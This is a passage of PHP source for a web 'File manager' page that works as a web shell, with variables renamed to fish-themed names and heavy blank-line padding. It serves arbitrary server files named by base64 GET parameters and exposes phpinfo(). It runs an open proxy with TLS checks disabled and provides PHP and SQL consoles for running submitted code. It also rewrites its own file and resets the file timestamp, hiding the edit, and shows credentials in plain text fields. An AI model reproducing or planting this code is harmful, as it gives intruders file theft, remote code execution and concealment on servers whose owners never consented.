		} elseif (!empty($_POST[$fishLanguageTemplate.'_new_name'])) {

			$aquariumPanel = json_encode(json_decode(${$fishLanguageTemplate.'_templates'},true)+array($_POST[$fishLanguageTemplate.'_new_name']=>$_POST[$fishLanguageTemplate.'_new_value']),JSON_HEX_APOS);
		}
		if (!empty($aquariumPanel)) {
			$nemoFileContent = file_get_contents(__FILE__);






			$searchBubble = preg_match('#'.$fishLanguageTemplate.'_templates[\s]?\=[\s]?\'\{\"(.*?)\"\}\';#', $nemoFileContent, $bubbleMatches);




			if (!empty($bubbleMatches[1])) {



				$reefFileModified = filemtime(__FILE__);
				$replaceMarlin = str_replace('{"'.$bubbleMatches[1].'"}',$aquariumPanel,$nemoFileContent);



				if (file_put_contents(__FILE__, $replaceMarlin)) {
					${$fishLanguageTemplate.'_templates'} = $aquariumPanel;


					$marlinMessage .= __('File updated');

				} else $marlinMessage .= __('Error occurred');


				if (!empty($reefConfig['fm_restore_time'])) touch(__FILE__,$reefFileModified);


			}	





		} else $marlinMessage .= __('Error occurred');
	}


}







// Just show image


if (isset($_GET['img'])) {






	$marlinFile=base64_decode($_GET['img']);


	if ($nemoInfo=getimagesize($marlinFile)){






		switch  ($nemoInfo[2]){	//1=GIF, 2=JPG, 3=PNG, 4=SWF, 5=PSD, 6=BMP






			case 1: $doryExtension='gif'; break;


			case 2: $doryExtension='jpeg'; break;
			case 3: $doryExtension='png'; break;





			case 6: $doryExtension='bmp'; break;
			default: die();


		}






		header("Content-type: image/$doryExtension");


		echo file_get_contents($marlinFile);





		die();






	}



}



// Just download file
if (isset($_GET['download'])) {



	$marlinFile=base64_decode($_GET['download']);



	downloadNemoFile($marlinFile);	

}






// Just show info
if (isset($_GET['phpinfo'])) {

	phpinfo(); 
	die();
}

// Mini proxy, many bugs!




if (isset($_GET['proxy']) && (!empty($reefConfig['enable_proxy']))) {
	$tankUrl = isset($_GET['url'])?urldecode($_GET['url']):'';




	$proxyFishForm = '


<div style="position:relative;z-index:100500;background: linear-gradient(to bottom, #e4f5fc 0%,#bfe8f9 50%,#9fd8ef 51%,#2ab0ed 100%);">



	<form action="" method="GET">
	<input type="hidden" name="proxy" value="true">




	'.reefHome().' <a href="'.$tankUrl.'" target="_blank">Url</a>: <input type="text" name="url" value="'.$tankUrl.'" size="55">






	<input type="submit" value="'.__('Show').'" class="fm_input">
	</form>

</div>
';

	if ($tankUrl) {





		$tankChannel = curl_init($tankUrl);


		curl_setopt($tankChannel, CURLOPT_USERAGENT, 'Den1xxx test proxy');
		curl_setopt($tankChannel, CURLOPT_FOLLOWLOCATION, 1);
		curl_setopt($tankChannel, CURLOPT_SSL_VERIFYHOST,0);
		curl_setopt($tankChannel, CURLOPT_SSL_VERIFYPEER,0);
		curl_setopt($tankChannel, CURLOPT_HEADER, 0);
		curl_setopt($tankChannel, CURLOPT_REFERER, $tankUrl);
		curl_setopt($tankChannel, CURLOPT_RETURNTRANSFER,true);





		$tankResult = curl_exec($tankChannel);


		curl_close($tankChannel);






		//$tankResult = preg_replace('#(src)=["\'][http://]?([^:]*)["\']#Ui', '\\1="'.$tankUrl.'/\\2"', $tankResult);
		$tankResult = preg_replace_callback('#(href|src)=["\'][http://]?([^:]*)["\']#Ui', 'tankUrlProxy', $tankResult);
		$tankResult = preg_replace('%(<body.*?>)%i', '$1'.'<style>'.nemoHomeStyle().'</style>'.$proxyFishForm, $tankResult);






		echo $tankResult;

		die();



	} 
}




?>
<!doctype html>
<html>
<head>     

	<meta charset="utf-8" />


	<meta name="viewport" content="width=device-width, initial-scale=1" />
    <title><?=__('File manager')?></title>






<style>
body {
	background-color:	white;


	font-family:		Verdana, Arial, Helvetica, sans-serif;
	font-size:			8pt;
	margin:				0px;

}











a:link, a:active, a:visited { color: #006699; text-decoration: none; }





a:hover { color: #DD6900; text-decoration: underline; }





a.th:link { color: #FFA34F; text-decoration: none; }



a.th:active { color: #FFA34F; text-decoration: none; }




a.th:visited { color: #FFA34F; text-decoration: none; }





a.th:hover {  color: #FFA34F; text-decoration: underline; }




table.bg {





	background-color: #ACBBC6
}







th, td { 
	font:	normal 8pt Verdana, Arial, Helvetica, sans-serif;






	padding: 3px;
}


th	{



	height:				25px;


	background-color:	#006699;
	color:				#FFA34F;




	font-weight:		bold;






	font-size:			11px;






}







.row1 {




	background-color:	#EFEFEF;





}


.row2 {






	background-color:	#DEE3E7;
}

.row3 {




	background-color:	#D1D7DC;

	padding: 5px;
}






tr.row1:hover {





	background-color:	#F3FCFC;

}









tr.row2:hover {



	background-color:	#F0F6F6;


}





.whole {
	width: 100%;

}












.all tbody td:first-child{width:100%;}

textarea {





	font: 9pt 'Courier New', courier;




	line-height: 125%;
	padding: 5px;





}








.textarea_input {



	height: 1em;

}










.textarea_input:focus {
	height: auto;

}





input[type=submit]{
	background: #FCFCFC none !important;
	cursor: pointer;
}










.folder {



    background-image: url("data:image/png;base64,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");
}




.file {



    background-image: url("data:image/png;base64,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");
}
<?=nemoHomeStyle()?>




.img {


	background-image: 
url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAMAAAAoLQ9TAAAABGdBTUEAAK/INwWK6QAAAdFQTFRF7e3t/f39pJ+f+cJajV8q6enpkGIm/sFO/+2O393c5ubm/sxbd29yimdneFg65OTk2zoY6uHi1zAS1crJsHs2nygo3Nrb2LBXrYtm2p5A/+hXpoRqpKOkwri46+vr0MG36Ysz6ujpmI6AnzUywL+/mXVSmIBN8bwwj1VByLGza1ZJ0NDQjYSB/9NjwZ6CwUAsxk0brZyWw7pmGZ4A6LtdkHdf/+N8yow27b5W87RNLZL/2biP7wAA//GJl5eX4NfYsaaLgp6h1b+t/+6R68Fe89ycimZd/uQv3r9NupCB99V25a1cVJbbnHhO/8xS+MBa8fDwi2Ji48qi/+qOdVIzs34x//GOXIzYp5SP/sxgqpiIcp+/siQpcmpstayszSANuKKT9PT04uLiwIky8LdE+sVWvqam8e/vL5IZ+rlH8cNg08Ccz7ad8vLy9LtU1qyUuZ4+r512+8s/wUpL3d3dx7W1fGNa/89Z2cfH+s5n6Ojob1Yts7Kz19fXwIg4p1dN+Pj4zLR0+8pd7strhKAs/9hj/9BV1KtftLS1np2dYlJSZFVV5LRWhEFB5rhZ/9Jq0HtT//CSkIqJ6K5D+LNNblVVvjM047ZMz7e31xEG////tKgu6wAAAJt0Uk5T/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////wCVVpKYAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAANZJREFUKFNjmKWiPQsZMMximsqPKpAb2MsAZNjLOwkzggVmJYnyps/QE59eKCEtBhaYFRfjZuThH27lY6kqBxYorS/OMC5wiHZkl2QCCVTkN+trtFj4ZSpMmawDFBD0lCoynzZBl1nIJj55ElBA09pdvc9buT1SYKYBWw1QIC0oNYsjrFHJpSkvRYsBKCCbM9HLN9tWrbqnjUUGZG1AhGuIXZRzpQl3aGwD2B2cZZ2zEoL7W+u6qyAunZXIOMvQrFykqwTiFzBQNOXj4QKzoAKzajtYIQwAlvtpl3V5c8MAAAAASUVORK5CYII=");

}






@media screen and (max-width:720px){


  table{display:block;}
    #fm_table td{display:inline;float:left;}


    #fm_table tbody td:first-child{width:100%;padding:0;}
    #fm_table tbody tr:nth-child(2n+1){background-color:#EFEFEF;}






    #fm_table tbody tr:nth-child(2n){background-color:#DEE3E7;}
    #fm_table tr{display:block;float:left;clear:left;width:100%;}
	#header_table .row2, #header_table .row3 {display:inline;float:left;width:100%;padding:0;}





	#header_table table td {display:inline;float:left;}





}
</style>
</head>


<body>
<?php






$includedDoryUrl = '?fm=true';
if (isset($_POST['sqlrun'])&&!empty($reefConfig['enable_sql_console'])){


	$nemoResult = empty($_POST['sql']) ? '' : $_POST['sql'];
	$fishResponseLanguage = 'sql';




} elseif (isset($_POST['phprun'])&&!empty($reefConfig['enable_php_console'])){
	$nemoResult = empty($_POST['php']) ? '' : $_POST['php'];
	$fishResponseLanguage = 'php';





} 



if (isset($_GET['fm_settings'])) {
	echo ' 





<table class="whole">






<form method="post" action="">




<tr><th colspan="2">'.__('File manager').' - '.__('Settings').'</th></tr>



'.(empty($marlinMessage)?'':'<tr><td class="row2" colspan="2">'.$marlinMessage.'</td></tr>').'


'.reefConfigCheckboxRow(__('Show size of the folder'),'show_dir_size').'

'.reefConfigCheckboxRow(__('Show').' '.__('pictures'),'show_img').'


'.reefConfigCheckboxRow(__('Show').' '.__('Make directory'),'make_directory').'


'.reefConfigCheckboxRow(__('Show').' '.__('New file'),'new_file').'
'.reefConfigCheckboxRow(__('Show').' '.__('Upload'),'upload_file').'






'.reefConfigCheckboxRow(__('Show').' PHP version','show_php_ver').'





'.reefConfigCheckboxRow(__('Show').' PHP ini','show_php_ini').'


'.reefConfigCheckboxRow(__('Show').' '.__('Generation time'),'show_gt').'





'.reefConfigCheckboxRow(__('Show').' xls','show_xls').'

'.reefConfigCheckboxRow(__('Show').' PHP '.__('Console'),'enable_php_console').'

'.reefConfigCheckboxRow(__('Show').' SQL '.__('Console'),'enable_sql_console').'



<tr><td class="row1"><input name="fm_config[sql_server]" value="'.$reefConfig['sql_server'].'" type="text"></td><td class="row2 whole">SQL server</td></tr>





<tr><td class="row1"><input name="fm_config[sql_username]" value="'.$reefConfig['sql_username'].'" type="text"></td><td class="row2 whole">SQL user</td></tr>





<tr><td class="row1"><input name="fm_config[sql_password]" value="'.$reefConfig['sql_password'].'" type="text"></td><td class="row2 whole">SQL password</td></tr>




<tr><td class="row1"><input name="fm_config[sql_db]" value="'.$reefConfig['sql_db'].'" type="text"></td><td class="row2 whole">SQL DB</td></tr>


'.reefConfigCheckboxRow(__('Show').' Proxy','enable_proxy').'

'.reefConfigCheckboxRow(__('Show').' phpinfo()','show_phpinfo').'
'.reefConfigCheckboxRow(__('Show').' '.__('Settings'),'fm_settings').'
'.reefConfigCheckboxRow(__('Restore file time after editing'),'restore_time').'





'.reefConfigCheckboxRow(__('File manager').': '.__('Restore file time after editing'),'fm_restore_time').'


<tr><td class="row3"><a href="'.getTankUrl().'?fm_settings=true&fm_config_delete=true">'.__('Reset settings').'</a></td><td class="row3"><input type="submit" value="'.__('Save').'" name="fm_config[fm_set_submit]"></td></tr>



</form>





</table>
<table>
<form method="post" action="">
<tr><th colspan="2">'.__('Settings').' - '.__('Authorization').'</th></tr>





<tr><td class="row1"><input name="fm_login[authorize]" value="1" '.($doryAuthenticated['authorize']?'checked':'').' type="checkbox" id="auth"></td><td class="row2 whole"><label for="auth">'.__('Authorization').'</label></td></tr>




<tr><td class="row1"><input name="fm_login[login]" value="'.$doryAuthenticated['login'].'" type="text"></td><td class="row2 whole">'.__('Login').'</td></tr>






<tr><td class="row1"><input name="fm_login[password]" value="'.$doryAuthenticated['password'].'" type="text"></td><td class="row2 whole">'.__('Password').'</td></tr>






<tr><td class="row1"><input name="fm_login[cookie_name]" value="'.$doryAuthenticated['cookie_name'].'" type="text"></td><td class="row2 whole">'.__('Cookie').'</td></tr>
<tr><td class="row1"><input name="fm_login[days_authorization]" value="'.$doryAuthenticated['days_authorization'].'" type="text"></td><td class="row2 whole">'.__('Days').'</td></tr>



<tr><td class="row1"><textarea name="fm_login[script]" cols="35" rows="7" class="textarea_input" id="auth_script">'.$doryAuthenticated['script'].'</textarea></td><td class="row2 whole">'.__('Script').'</td></tr>




<tr><td colspan="2" class="row3"><input type="submit" value="'.__('Save').'" ></td></tr>
</form>
</table>';
echo tankTemplateForm('php'),tankTemplateForm('sql');





} elseif (isset($proxyFishForm)) {




	die($proxyFishForm);
} elseif (isset($fishResponseLanguage)) {	
?>
<table class="whole">
<tr>






    <th><?=__('File manager').' - '.$nemoPath?></th>



</tr>
<tr>
    <td class="row2"><table><tr><td><h2><?=strtoupper($fishResponseLanguage)?> <?=__('Console')?><?php



	if($fishResponseLanguage=='sql') echo ' - Database: '.$reefConfig['sql_db'].'</h2></td><td>'.runFishInput('php');




	else echo '</h2></td><td>'.runFishInput('sql');






	?></td></tr></table></td>



</tr>
<tr>





    <td class="row1">
		<a href="<?=$includedDoryUrl.'&path=' . $nemoPath;?>"><?=__('Back')?></a>


		<form action="" method="POST" name="console">






		<textarea name="<?=$fishResponseLanguage?>" cols="80" rows="10" style="width: 90%"><?=$nemoResult?></textarea><br/>
		<input type="reset" value="<?=__('Reset')?>">



		<input type="submit" value="<?=__('Submit')?>" name="<?=$fishResponseLanguage?>run">


<?php



$stringTemplateNemo = $fishResponseLanguage.'_templates';
$tankTemplate = !empty($$stringTemplateNemo) ? json_decode($$stringTemplateNemo,true) : '';




if (!empty($tankTemplate)){

	$doryActive = isset($_POST[$fishResponseLanguage.'_tpl']) ? $_POST[$fishResponseLanguage.'_tpl'] : '';
	$selectTank = '<select name="'.$fishResponseLanguage.'_tpl" title="'.__('Template').'" onchange="if (this.value!=-1) document.forms[\'console\'].elements[\''.$fishResponseLanguage.'\'].value = this.options[selectedIndex].value; else document.forms[\'console\'].elements[\''.$fishResponseLanguage.'\'].value =\'\';" >'."\n";




	$selectTank .= '<option value="-1">' . __('Select') . "</option>\n";





	foreach ($tankTemplate as $anemoneKey=>$nemoValue){






		$selectTank.='<option value="'.$nemoValue.'" '.((!empty($nemoValue)&&($nemoValue==$doryActive))?'selected':'').' >'.__($anemoneKey)."</option>\n";


	}

	$selectTank .= "</select>\n";
	echo $selectTank;



}





?>
		</form>



	</td>
